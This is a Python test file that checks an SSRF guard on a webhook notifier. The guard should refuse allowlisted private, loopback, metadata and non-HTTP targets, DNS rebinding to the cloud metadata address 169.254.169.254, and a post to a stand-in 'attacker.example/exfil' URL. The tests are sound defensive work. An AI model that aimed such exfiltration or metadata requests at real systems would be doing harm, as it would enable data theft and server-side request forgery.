"""Adversarial tests for the webhook notifier.

The allowlist is a routing control, not the SSRF defense: even when an
attacker-influenced entry lands on the allowlist, the pinned resolver
must still refuse private, loopback, link-local, and metadata targets.
"""

import pytest

from arrowhead.auth.principal import as_principal
from arrowhead.config import get_settings
from arrowhead.errors import ToolError
from arrowhead.security.ssrf_guard import BlockedURLError
from arrowhead.tools.notify import notify_webhook, post_webhook
from tests.security.payloads import SSRF_PAYLOADS

HTTP_SSRF = [url for url in SSRF_PAYLOADS if url.startswith("http")]
OTHER_SCHEME_SSRF = [
    url for url in SSRF_PAYLOADS if not url.startswith("http")
]


@pytest.mark.parametrize("url", HTTP_SSRF)
async def test_private_targets_are_refused_even_when_allowlisted(
    configure_env, url
):
    # The operator (or an attacker who influenced the config) allowlists
    # the hostile target itself; the SSRF guard must still refuse it.
    configure_env(ARROWHEAD_NOTIFY_ALLOWLIST=url)
    with as_principal("mallory", {"notify:send"}):
        with pytest.raises(ToolError):
            await notify_webhook(url=url, payload={"probe": True})


@pytest.mark.parametrize("url", OTHER_SCHEME_SSRF)
async def test_non_http_schemes_never_match_the_allowlist(
    configure_env, url
):
    configure_env(ARROWHEAD_NOTIFY_ALLOWLIST="https://hooks.example.com/ci")
    with as_principal("mallory", {"notify:send"}):
        with pytest.raises(ToolError):
            await notify_webhook(url=url, payload={})


async def test_unlisted_public_host_is_refused(configure_env):
    configure_env(ARROWHEAD_NOTIFY_ALLOWLIST="https://hooks.example.com/ci")
    with as_principal("mallory", {"notify:send"}):
        with pytest.raises(ToolError):
            await notify_webhook(
                url="https://attacker.example/exfil", payload={"data": "x"}
            )


async def test_dns_rebind_to_metadata_is_refused(
    configure_env, make_resolver
):
    # The allowlisted hostname is legitimate, but its DNS answer points at
    # the cloud metadata service; the pinned resolver must refuse it.
    configure_env(ARROWHEAD_NOTIFY_ALLOWLIST="https://hooks.example.com/ci")
    with pytest.raises(BlockedURLError):
        await post_webhook(
            "https://hooks.example.com/ci",
            b"{}",
            get_settings(),
            getaddrinfo=make_resolver("169.254.169.254"),
        )


async def test_mixed_answer_with_one_private_address_is_refused(
    configure_env, make_resolver
):
    configure_env(ARROWHEAD_NOTIFY_ALLOWLIST="https://hooks.example.com/ci")
    with pytest.raises(BlockedURLError):
        await post_webhook(
            "https://hooks.example.com/ci",
            b"{}",
            get_settings(),
            getaddrinfo=make_resolver("93.184.216.34", "10.0.0.5"),
        )
